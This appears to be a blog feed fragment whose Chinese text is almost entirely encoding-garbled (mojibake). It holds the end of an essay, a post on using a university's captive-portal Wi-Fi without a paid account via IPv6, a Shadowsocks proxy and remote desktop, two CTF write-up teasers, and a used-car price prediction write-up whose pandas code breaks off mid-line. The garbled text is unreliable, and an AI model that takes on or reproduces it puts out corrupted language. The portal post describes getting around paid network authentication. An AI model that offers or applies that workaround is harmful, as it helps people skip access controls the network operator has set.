ä¸ºè¦ç¬¦åˆå…¶åˆ©ç›Šè€Œå°†å…¶ä¿®é¥°ã€‚â€</p><p>6è€å¸ˆè¯´ï¼šâ€œè¦æ€è€ƒï¼Œå­¦ä¼šæ€è€ƒï¼â€</p><p>â€¦â€¦</p><p>æˆ‘å½“æ—¶ä¸ä»¥ä¸ºç„¶ï¼Œæ€è€ƒï¼Ÿæ€ä¹ˆæ€è€ƒå˜›ï¼</p><p>åæ¥æˆ‘æ…¢æ…¢çŸ¥é“äº†ï¼Œç›´åˆ°ç°åœ¨ï¼Œæˆ‘éƒ½å¾ˆè®¤å¯6è€å¸ˆï¼Œæˆ‘è§‰å¾—ä»–å¾ˆå¯¹ã€‚</p><p>ä¸ç®¡æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šè¢«äººä¿®é¥°ï¼Œåªæœ‰è‡ªç„¶ç§‘å­¦ä¸èƒ½è¢«ä¿®é¥°ã€‚å°±åƒï¼Œä¸ç®¡æ˜¯è°ï¼Œä¹Ÿä¸èƒ½è®©äººç›¸ä¿¡ 1+1=3ï¼Œè¿™æ˜¯æ•°å­¦ã€‚ç‰©ç†ã€åŒ–å­¦ç­‰å…¶ä»–è‡ªç„¶ç§‘å­¦çš„åŸç†ï¼Œä¹ƒè‡³ç»æµå­¦åŸç†ï¼Œéƒ½ä¸èƒ½è¢«ä¿®é¥°ã€‚</p><p>ä¹Ÿè®¸æ€è€ƒï¼Œå°±æ˜¯è¦ä»è‡ªç„¶ç§‘å­¦ç«‹è¶³å§ï¼Ÿ</p><p>å°±æ¯”å¦‚ä»æ•°å­¦é€»è¾‘é‡Œå»¶ç”³â€”â€”ä»»ä½•äº‹æƒ…éƒ½æ˜¯æœ‰é€»è¾‘çš„ï¼Œéƒ½åº”æœ‰å‰å› åæœã€‚å½“ä¸€ä»¶äº‹å‘ç”Ÿæ—¶ï¼Œä¹Ÿè®¸å‘¨å›´äººéƒ½ä¼šè®²è¿°â€œè¿™ä»¶äº‹å‘ç”Ÿäº†â€ï¼Œå¯å´é²œæœ‰äººè¿½æº¯ï¼Œè¿™ä»¶äº‹ä¸ºä»€ä¹ˆå‘ç”Ÿï¼Ÿå½“å…¨ç¤¾ä¼šéƒ½åœ¨ä¸ºè¿™ä»¶äº‹ç—´ç‹‚ï¼Œä¹ƒè‡³è¦å°†è¿™ä»¶äº‹ä½œä¸ºâ€œåŸå› â€ï¼Œé‡‡å–è¡ŒåŠ¨ï¼ˆäº§ç”Ÿæ–°çš„â€œç»“æœâ€ï¼‰æ—¶ï¼Œè¿˜æ˜¯æ²¡æœ‰å¤šå°‘äººå»å…³æ³¨è¿™ä»¶äº‹çš„æ ¹æœ¬åŸå› ã€å†å²åŸå› ã€ç›´æ¥åŸå› ä¹‹é—´çš„å…³ç³»ã€‚ç„¶åï¼Œç»å¤§å¤šæ•°äººéƒ½è¢«é¼“åŠ¨èµ·æ¥äº†ï¼Œå°±åƒå››å¹´å‰çš„æˆ‘ï¼Œå»ç¬‘6è€å¸ˆâ€¦â€¦</p><p>è§‚å¯Ÿèº«è¾¹çš„å„ç§å˜åŒ–ï¼Œå„ç§è‡ªç„¶ç¯å¢ƒç¤¾ä¼šç¯å¢ƒçš„å˜åŒ–ï¼Œå„ç§è®©äººå¼€å¿ƒæˆ–éš¾å—æˆ–é„™å¤·çš„äº‹ï¼Œå»æ€è€ƒï¼Œâ€œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿâ€</p><p>ä¹Ÿè®¸è¿™å°±æ˜¯æ‰€è°“â€œç†æ€§â€ï¼Ÿ</p><p>æˆ‘ä¸çŸ¥é“å‡ ç™¾å¹´å‰æ¬§æ´²å¯è’™è¿åŠ¨æå€¡çš„â€œç†æ€§â€æ˜¯å¦å°±æ˜¯ä¸ºäº†è§£å†³è¿™æ ·çš„é—®é¢˜ã€‚</p><p>â€œè¦æ€è€ƒï¼Œå­¦ä¼šæ€è€ƒï¼â€</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/</id>
        <title><![CDATA[å…è´¹ä½¿ç”¨ nuaa.portal ä¸Šç½‘]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å­¦æ ¡èµäºˆæˆ‘çš„ nuaa.portal è´¦å·åœ¨ä¸€ä¸ªæœˆä¹‹å‰å°±åˆ°æœŸäº†ï¼Œè¿™ä¸€ä¸ªæœˆå†…ï¼Œè™½ç„¶å¯¹æˆ‘çš„ç”Ÿæ´»æ²¡æœ‰å¤ªå¤§çš„å½±å“ï¼Œä½†æ˜¯è¿˜æ˜¯æ„Ÿå—åˆ°äº†æŸäº›ä¸ä¾¿ï¼ˆæ€»è§‰å¾—æŸäº›ä¸œè¥¿æœ‰äº†æ›´å¥½ï¼Œæ²¡æœ‰å´ä¸èƒ½æ‹‰å€’ï¼‰ã€‚å‰äº›å¤©è·Ÿåˆ›æ–°åŒºå†…çš„åŒå­¦è®¨è®ºäº†æœ¬æ ¡çš„ipv6éƒ¨ç½²æƒ…å†µï¼Œçªç„¶å°±æœ‰å…´è‡´æ¥æŠ˜è…¾ä¸€ä¸‹ã€‚</p><p>æ²¡é”™ï¼Œå…è´¹ä¸Šç½‘è¿˜æ˜¯æœ‰å¯èƒ½çš„ã€‚</p><h2 id="å‰ææ¦‚è¦"><a href="#å‰ææ¦‚è¦" class="headerlink" title="å‰ææ¦‚è¦"></a>å‰ææ¦‚è¦</h2><ul><li>å­¦æ ¡çš„ nuaa.portal å…¬å…±æ— çº¿ç½‘ï¼ŒWindows ç”µè„‘åªè¦è¿æ¥ä¸Šï¼Œå°±èƒ½è·å–ä¸€ä¸ª ipv4 å†…ç½‘åœ°å€å’Œä¸€ä¸ª ipv6 åœ°å€ã€‚å¦‚æœæ²¡æœ‰åœ¨æŒ‡å®š Web é¡µé¢ä¸Šè®¤è¯ï¼Œåˆ™æ— æ³•ä½¿ç”¨ ipv4 è¿æ¥äº’è”ç½‘ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ ipv6 è”ç½‘ã€‚</li><li>å­¦æ ¡é»˜è®¤ä¸åˆ†é… ipv6 çš„ DNS æœåŠ¡å™¨ã€‚</li><li>å­¦æ ¡æ•™å­¦åŠå…¬åŒºæœ‰çº¿å®½å¸¦ï¼Œç»ç›´æ¥æ‹¨å·ï¼ŒåŒæ ·å¯ä»¥è·å¾—ä¸€ä¸ª ipv4 å†…ç½‘åœ°å€å’Œä¸€ä¸ª ipv6 åœ°å€ï¼Œå‡å¯ä»¥è®¿é—®äº’è”ç½‘ã€‚</li></ul><h2 id="ä¸€æ­¥æ­¥çš„å°è¯•"><a href="#ä¸€æ­¥æ­¥çš„å°è¯•" class="headerlink" title="ä¸€æ­¥æ­¥çš„å°è¯•"></a>ä¸€æ­¥æ­¥çš„å°è¯•</h2><h3 id="ç›´æ¥ç”¨-ipv6-ä¸Šæä¾›-ipv6-æœåŠ¡çš„ç½‘ç«™"><a href="#ç›´æ¥ç”¨-ipv6-ä¸Šæä¾›-ipv6-æœåŠ¡çš„ç½‘ç«™" class="headerlink" title="ç›´æ¥ç”¨ ipv6 ä¸Šæä¾› ipv6 æœåŠ¡çš„ç½‘ç«™"></a>ç›´æ¥ç”¨ ipv6 ä¸Šæä¾› ipv6 æœåŠ¡çš„ç½‘ç«™</h3><p>æ—¢ç„¶å¯ä»¥ä» nuaa.portal è·å–å¯ä»¥è®¿é—®äº’è”ç½‘çš„ ipv6 åœ°å€ï¼Œé‚£ä¹ˆæœ€ç®€å•çš„æ€è·¯ï¼Œå°±æ˜¯ç›´æ¥ä½¿ç”¨è¿™æ¡é€šé“ã€‚ä½†æ˜¯ï¼Œç”±äºå­¦æ ¡æ²¡æœ‰ ipv6 çš„ DNSï¼ˆè®¤è¯åï¼Œå¦‚æœè®¿é—® ipv6 ç«™ç‚¹ï¼Œå…¶å®ä»ç„¶æ˜¯ä½¿ç”¨ ipv4 çš„ DNS æœåŠ¡å™¨ï¼‰ï¼Œæ•…å¿…é¡»é…ç½® ipv6 çš„ DNSã€‚è¿™ä¸€ç‚¹å¾ˆç®€å•ï¼Œç›´æ¥ä¿®æ”¹ DNS æœåŠ¡å™¨å³å¯ï¼š</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_2.png" alt></p><p>è¿™é‡Œæ¨èä¸¤ä¸ª ipv6 çš„ DNS æœåŠ¡å™¨ï¼Œä¸€ä¸ªæ˜¯ Google å®¶çš„ï¼Œä¸€ä¸ªæ˜¯æ¸…åå¤§å­¦ TUNA åä¼šçš„ï¼š</p><ul><li><code>2001:4860:4860::8888</code></li><li><code>2001:da8::666</code></li></ul><p>ç„¶åï¼Œå®æµ‹å°±å¯ä»¥è®¿é—®æä¾› ipv6 æœåŠ¡çš„ç½‘ç«™å•¦ï¼</p><p>æ¯”å¦‚ï¼š</p><ul><li>google.com.hk</li><li><a href="http://www.youtube.com" target="_blank" rel="noopener">www.youtube.com</a></li><li>ipv6.baidu.com</li><li>ipv6.mirrors.ustc.edu.cn</li></ul><h3 id="ä½¿ç”¨-ipv6-ä»£ç†æœåŠ¡å™¨è¿›è¡Œæ— é™åˆ¶çš„äº’è”ç½‘è®¿é—®"><a href="#ä½¿ç”¨-ipv6-ä»£ç†æœåŠ¡å™¨è¿›è¡Œæ— é™åˆ¶çš„äº’è”ç½‘è®¿é—®" class="headerlink" title="ä½¿ç”¨ ipv6 ä»£ç†æœåŠ¡å™¨è¿›è¡Œæ— é™åˆ¶çš„äº’è”ç½‘è®¿é—®"></a>ä½¿ç”¨ ipv6 ä»£ç†æœåŠ¡å™¨è¿›è¡Œæ— é™åˆ¶çš„äº’è”ç½‘è®¿é—®</h3><p>ä¸Šä¸€æ¡æ–¹æ³•è™½ç„¶ç®€å•ï¼Œä½†æ˜¯åªèƒ½è®¿é—®æä¾› ipv6 çš„ç½‘ç«™ï¼Œç„¶è€Œç°åœ¨å›½å†…ä¹ƒè‡³å›½é™…ä¸Šå¤§å¤šæ•°ç½‘ç«™å¹¶æ²¡æœ‰æä¾› ipv6 æœåŠ¡ï¼Œè‡³å°‘ï¼Œä½ ç›®å‰è¿˜ä¸èƒ½ç™»å¾®ä¿¡ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœæœ‰ä¸€ä¸ªåŒæ—¶å…·æœ‰æœ‰ ipv6 å’Œ ipv4 çš„ä»£ç†æœåŠ¡å™¨ï¼Œä¸å°±ä¸€åˆ‡éƒ½è§£å†³äº†å—ï¼ŸæŠŠæœ¬åœ°çš„æ‰€æœ‰æµé‡éƒ½é€šè¿‡ ipv6 è½¬å‘è‡³ä»£ç†æœåŠ¡å™¨ï¼Œç„¶åå°±å¯ä»¥è®¿é—®ä»»æ„ç«™ç‚¹äº†ï¼</p><p>è¿™é‡Œï¼Œæˆ‘å€Ÿç”¨äº† Shadowsocksï¼Œé…ç½®äº†ä¸€å°æœ‰ ipv6 å’Œ ipv4 çš„æœåŠ¡å™¨ï¼Œç„¶åæœ¬åœ°å¼€å¯å…¨å±€ä»£ç†ï¼Œå®é™…å°±å¯ä»¥è®¿é—®ä»»æ„ç«™ç‚¹äº†ã€‚</p><p>ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæœ¬åœ° DNS ç”šè‡³éƒ½ä¸éœ€è¦é…ç½®ã€‚</p><h3 id="ç»ˆæï¼ˆç¡¬æ ¸ï¼‰è¹­ç½‘æ–¹æ¡ˆ"><a href="#ç»ˆæï¼ˆç¡¬æ ¸ï¼‰è¹­ç½‘æ–¹æ¡ˆ" class="headerlink" title="ç»ˆæï¼ˆç¡¬æ ¸ï¼‰è¹­ç½‘æ–¹æ¡ˆ"></a>ç»ˆæï¼ˆç¡¬æ ¸ï¼‰è¹­ç½‘æ–¹æ¡ˆ</h3><p>è¿˜è®°å¾—ä¸€å¼€å§‹æˆ‘è¯´è¿‡ï¼Œæ•™å­¦åŠå…¬åŒºä¹Ÿèƒ½è·å¾— ipv6 åœ°å€å—ï¼Ÿ</p><p>å¯¹ï¼Œæˆ‘å°±æ˜¯æƒ³ç”¨è¿œç¨‹æ¡Œé¢ï¼</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_1.jpg" alt></p><p>æˆ‘åœ¨å­¦æ ¡åˆ›æ–°åŒºæ—¥å¸¸å¼€ç€ä¸€å°æœºå™¨ï¼Œæ‹¨å·è”ç½‘ï¼Œï¼ˆæ€§èƒ½è¿˜ä¸é”™ï¼‰ã€‚</p><p>emmmï¼Œå…¶å®è¿™ä¸ªæ–¹æ³•çœŸçš„å¾ˆç¡¬æ ¸å¾ˆæœ‰æ•ˆï¼Œè€Œä¸”ï¼Œç”±äº nuaa.portal å’Œæ•™å­¦åŠå…¬åŒºå®é™…å±äºåŒä¸€ä¸ªå¤§çš„å†…ç½‘ç¯å¢ƒï¼Œå­¦æ ¡çš„è·¯ç”±å™¨è¿˜ä¸é”™ï¼Œå®æµ‹ ping å»¶è¿Ÿåªæœ‰ 2msï¼Œå®Œå…¨æ»¡è¶³äº†æ—¥å¸¸ç”µè„‘ä½¿ç”¨ï¼ˆé™¤äº†ä¸èƒ½ä½¿ç”¨æ˜¾å¡ç©æ¸¸æˆä»€ä¹ˆçš„ï¼‰ã€‚å¾®è½¯å®¶çš„è¿œç¨‹æ¡Œé¢è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ï¼</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æˆ‘å…¶å®è¿˜æ˜¯æƒ³å†æ¥ä¸€å¹´çš„å…è´¹ nuaa.portal è´¦å·çš„ã€‚</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/</id>
        <title><![CDATA[CTF | 2020 DASCTF å››æœˆæ˜¥å­£æˆ˜ Re&Misc WriteUp]]></title>
        <updated>2020-04-26T12:18:11+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/"><![CDATA[ä»Šå¤©ä¸‹åˆæœ‰ä¸ª DASCTF å®‰æ’æœˆèµ›ï¼Œéš¾åº¦æ®è¯´â€œé›¨éœ²å‡æ²¾â€ï¼Œå°±æ¥çœ‹äº†çœ‹é¢˜ï¼Œåšäº†å‡ ä¸ªReå’ŒMiscçš„é¢˜ï¼Œåˆ’ä¸ªæ°´ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/</id>
        <title><![CDATA[CTF | 2020 Ha1cyon_CTFå…¬å¼€èµ› WriteUp]]></title>
        <updated>2020-04-22T06:06:43+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/"><![CDATA[å‘¨æœ«çœ‹äº†ä¸€ä¸‹Ha1cyon_CTFâ€œèŒæ–°â€å…¬å¼€èµ›çš„é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸€ä¸ªéš¾åˆ°çˆ†ç‚¸çš„è¹²WPåŠé€€æ¯”èµ›ã€‚å°±å†™å†™éƒ¨åˆ†WPï¼Œå†æ¥ç‚¹å°ä½“ä¼šå§ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[å¤©æ± äºŒæ‰‹è½¦äº¤æ˜“ä»·æ ¼é¢„æµ‹-èµ›åæ€»ç»“]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>æœ€ç»ˆæˆç»©ï¼š62 / 2776<br>æ¯”èµ›åœ°å€ï¼š<a href="https://tianchi.aliyun.com/competition/entrance/231784/introduction" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/231784/introduction</a><br>æºç ï¼š<a href="https://github.com/LogicJake/competition_baselines/tree/master/competitions/tianchi_car_sale/final" target="_blank" rel="noopener">https://github.com/LogicJake/competition_baselines/tree/master/competitions/tianchi_car_sale/final</a></p><h1 id="æ¯”èµ›ä»‹ç»"><a href="#æ¯”èµ›ä»‹ç»" class="headerlink" title="æ¯”èµ›ä»‹ç»"></a>æ¯”èµ›ä»‹ç»</h1><p>æœ¬æ¬¡æ–°äººèµ›æ˜¯Datawhaleä¸å¤©æ± è”åˆå‘èµ·çš„0åŸºç¡€å…¥é—¨ç³»åˆ—èµ›äº‹ç¬¬ä¸€åœº â€”â€” é›¶åŸºç¡€å…¥é—¨æ•°æ®æŒ–æ˜ä¹‹äºŒæ‰‹è½¦äº¤æ˜“ä»·æ ¼é¢„æµ‹å¤§èµ›ã€‚</p><p>èµ›é¢˜ä»¥äºŒæ‰‹è½¦å¸‚åœºä¸ºèƒŒæ™¯ï¼Œè¦æ±‚é€‰æ‰‹é¢„æµ‹äºŒæ‰‹æ±½è½¦çš„äº¤æ˜“ä»·æ ¼ï¼Œè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„å›å½’é—®é¢˜ã€‚é€šè¿‡è¿™é“èµ›é¢˜æ¥å¼•å¯¼å¤§å®¶èµ°è¿›AIæ•°æ®ç«èµ›çš„ä¸–ç•Œï¼Œä¸»è¦é’ˆå¯¹äºäºç«èµ›æ–°äººè¿›è¡Œè‡ªæˆ‘ç»ƒä¹ ã€è‡ªæˆ‘æé«˜ã€‚</p><p>ä¸ºäº†æ›´å¥½çš„å¼•å¯¼å¤§å®¶å…¥é—¨ï¼Œæˆ‘ä»¬åŒæ—¶ä¸ºæœ¬èµ›é¢˜å®šåˆ¶äº†ç³»åˆ—å­¦ä¹ æ–¹æ¡ˆï¼Œå…¶ä¸­åŒ…æ‹¬æ•°æ®ç§‘å­¦åº“ã€é€šç”¨æµç¨‹å’Œbaselineæ–¹æ¡ˆå­¦ä¹ ä¸‰éƒ¨åˆ†ã€‚é€šè¿‡å¯¹æœ¬æ–¹æ¡ˆçš„å®Œæ•´å­¦ä¹ ï¼Œå¯ä»¥å¸®åŠ©æŒæ¡æ•°æ®ç«èµ›åŸºæœ¬æŠ€èƒ½ã€‚åŒæ—¶æˆ‘ä»¬ä¹Ÿå°†æä¾›ä¸“å±çš„è§†é¢‘ç›´æ’­å­¦ä¹ é€šé“ã€‚</p><h1 id="EDA"><a href="#EDA" class="headerlink" title="EDA"></a>EDA</h1><p>è¯¦ç»†çš„ eda å¯ä»¥å‚è€ƒå¤©æ‰å„¿ç«¥åœ¨å¤©æ± çš„åˆ†äº«: <a href="https://tianchi.aliyun.com/notebook-ai/detail?postId=95276" target="_blank" rel="noopener">https://tianchi.aliyun.com/notebook-ai/detail?postId=95276</a></p><p>æ•°æ®é›†çš„æ ¼å¼å¦‚ä¸‹ï¼š  </p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_data.jpeg" alt="æ•°æ®æ ¼å¼" title="">                </div>                <div class="image-caption">æ•°æ®æ ¼å¼</div>            </figure></div><p>ç‰¹å¾å¯ä»¥åˆ†æˆä¸‰ç±»:</p><ul><li>æ—¥æœŸç‰¹å¾: regDate, creatDate</li><li>ç±»åˆ«ç‰¹å¾: name, model, brand, bodyType, fuelType, gearbox, notRepairedDamage, regionCode, seller, offerType</li><li>æ•°å€¼ç‰¹å¾: power, kilometerå’Œ15ä¸ªåŒ¿åç‰¹å¾</li></ul><p>è¿™é‡Œä¸»è¦å…³æ³¨ç‰¹å¾çš„ç¼ºå¤±ç‡å’Œ nunique ä¿¡æ¯ï¼Œä¸»è¦æ˜¯çœ‹æœ‰æ²¡æœ‰ç¼ºå¤±è¿‡å¤šæˆ– nunique å¤ªå°‘çš„ç‰¹å¾ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸¤ç§ç‰¹å¾å¯¹æ¨¡å‹å­¦ä¹ èµ·ä¸åˆ°ä½œç”¨ã€‚æ•°å€¼ç‰¹å¾ power å’Œ kilometer nunique å€¼æ¯”è¾ƒå°‘ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯æ•°æ®åšäº†å¤„ç†ï¼ŒæŠ¹å»äº†ç²¾åº¦ã€‚seller å’Œ offerType åªæœ‰ä¸¤ä¸ªç”šè‡³1ä¸ªä¸åŒçš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥åˆ å», å¯¹æ¨¡å‹å­¦ä¹ èµ·ä¸åˆ°ä½œç”¨ï¼Œæ¨¡å‹çš„ç‰¹å¾é‡è¦æ€§ä¹Ÿä¸º0ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda1.png" alt="æ•°æ®ç»Ÿè®¡" title="">                </div>                <div class="image-caption">æ•°æ®ç»Ÿè®¡</div>            </figure></div><p>åŒ¿åç‰¹å¾çš„åˆ†å¸ƒè§ä¸‹å›¾ï¼ŒåŒ¿åç‰¹å¾åœ¨æœ€åçš„æ¨¡å‹é‡è¦æ€§éƒ½æŒºé«˜çš„ï¼Œå¯ä»¥å¥½å¥½æŒ–æ˜ä¸€ä¸‹ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda2.jpeg" alt="åŒ¿åç‰¹å¾" title="">                </div>                <div class="image-caption">åŒ¿åç‰¹å¾</div>            </figure></div><h1 id="æ•°æ®å¤„ç†"><a href="#æ•°æ®å¤„ç†" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h1><h2 id="ç¼ºå¤±å€¼å¤„ç†"><a href="#ç¼ºå¤±å€¼å¤„ç†" class="headerlink" title="ç¼ºå¤±å€¼å¤„ç†"></a>ç¼ºå¤±å€¼å¤„ç†</h2><p>ç¼ºå¤±å€¼ä¸»è¦é›†ä¸­åœ¨bodyTypeï¼ŒfuelTypeï¼Œgearboxï¼Œæˆ‘çš„æ€è·¯æ˜¯æ±½è½¦çš„æŒ‡æ ‡å¾€å¾€å’Œå…¶æ‰€å±çš„å“ç‰Œå’Œè½¦å‹æœ‰è¾ƒå¤§å…³ç³»ï¼Œæ‰€ä»¥é‡‡ç”¨è¯¥å“ç‰Œè½¦å‹ä¸‹çš„ä¼—æ•°æ¥å¡«è¡¥ç¼ºå¤±å€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from scipy import stats</span><br><span class="line"></span><br><span class="line">cols &#x3D; [&#39;bodyType&#39;, &#39;fuelType&#39;, &#39;gearbox&#39;]</span><br><span class="line">df_feature[&#39;gp&#39;] &#x3D; df_feature[&#39;brand&#39;].astype(</span><br><span class="line">    &#39;str&#39;) + df_feature[&#39;model&#39;].astype(&#39;str&#39;)</span><br><span class="line">gp_col &#x3D; &#39;gp&#39;</span><br><span class="line"></span><br><span class="line">df_na &#x3D; df_feature[cols].isna()</span><br><span class="line">df_mode &#x3D; df_feature.groupby(gp_col)[cols].agg(</span><br><span class="line">    lambda x: stats.mode(x)[0][0])</span><br><span class="line"></span><br><span class="line">for col in cols:</span><br><span class="line">    na_series &#x3D; df_na[col]</span><br><span class="line">    names &#x3D; list(df_feature.loc[na_series, gp_col])</span><br><span class="line"></span><br><span class="line">    t &#x3D; df_mode.loc[names, col]</span><br><span class="line">    t.index &#x3D; df_feature.loc[na_series, col].index</span><br><span class="line"></span><br><span class="line">    df_feature.loc[na_series, col] &#x3D; t</span><br><span class="line"></span><br><span class="line">del df_feature[&#39;gp&#39;]</span><br><span class="line">df_feature[cols].isnull().sum()</span><br></pre></td></tr></table></figure><h2 id="ç›®æ ‡å˜é‡åˆ†å¸ƒå˜æ¢"><a href="#ç›®æ ‡å˜é‡åˆ†å¸ƒå˜æ¢" class="headerlink" title="ç›®æ ‡å˜é‡åˆ†å¸ƒå˜æ¢"></a>ç›®æ ‡å˜é‡åˆ†å¸ƒå˜æ¢</h2><p>ä¸€èˆ¬æ¥è¯´å¯¹äºå›å½’é—®é¢˜ï¼Œç›®æ ‡å˜é‡æ­£æ€åŒ–å¯¹æ¨¡å‹é¢„æµ‹æœ‰å¸®åŠ©ï¼Œä¸‹å›¾å±•ç¤ºäº†ä½¿ç”¨ log1p å‰åçš„ä»·æ ¼åˆ†å¸ƒæƒ…å†µã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/carsale_eda3.png" alt="ä»·æ ¼åˆ†å¸ƒ" title="">                </div>                <div class="image-caption">ä»·æ ¼åˆ†å¸ƒ</div>            </figure></div><h2 id="æ— æ•ˆç‰¹å¾åˆ é™¤"><a href="#æ— æ•ˆç‰¹å¾åˆ é™¤" class="headerlink" title="æ— æ•ˆç‰¹å¾åˆ é™¤"></a>æ— æ•ˆç‰¹å¾åˆ é™¤</h2><p>seller å’Œ offerType åªæœ‰ä¸¤ä¸ªç”šè‡³1ä¸ªä¸åŒçš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥åˆ å», å¯¹æ¨¡å‹å­¦ä¹ èµ·ä¸åˆ°ä½œç”¨ï¼Œæ¨¡å‹çš„ç‰¹å¾é‡è¦æ€§ä¹Ÿä¸º0ã€‚</p><h1 id="ç‰¹å¾å·¥ç¨‹"><a href="#ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹"></a>ç‰¹å¾å·¥ç¨‹</h1><h2 id="åŸºç¡€ç‰¹å¾"><a href="#åŸºç¡€ç‰¹å¾" class="headerlink" title="åŸºç¡€ç‰¹å¾"></a>åŸºç¡€ç‰¹å¾</h2><p>å¯¹äºä¸¤ä¸ªæ—¥æœŸç‰¹å¾æ±½è½¦æ³¨å†Œæ—¥æœŸå’Œå¼€å§‹å”®å–æ—¶é—´ï¼Œå¯ä»¥äºŒè€…åšå·®å€¼è®¡ç®—æ±½è½¦å”®å–æ—¶çš„ä½¿ç”¨æ—¶é—´ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨äº†å¹´å’Œå¤©æ¥åˆ»ç”»ã€‚é™¤æ­¤ä»¥å¤–ï¼Œæ±½è½¦æ˜¯å“ªä¸€å¹´æ³¨å†Œçš„å¯¹ä»·æ ¼çš„å½±å“ä¹ŸæŒºå¤§ã€‚æ•°æ®ä¸­å­˜åœ¨ä¸€äº›å¼‚å¸¸æ—¥æœŸæ•°æ®ï¼šæœˆä»½ä¸º0ï¼Œå¤„ç†çš„æ—¶å€™å°†å…¶ç½®ä¸º1å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;car_age_day&#39;] &#x3D; ( df_feature[&#39;creatDate&#39;] - df_feature[&#39;regDate&#39;]).dt.days</span><br><span class="line">df_feature[&#39;car_age_year&#39;] &#x3D; round(df_feature[&#39;car_age_day&#39;] &#x2F; 365, 1)</span><br></pre></td></tr></table></figure><p>å¯¹äºç±»åˆ«ç‰¹å¾, å¯ä»¥è®¡ç®—countå±æ€§, ååº”é”€å”®çƒ­åº¦ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;name_count&#39;] &#x3D; 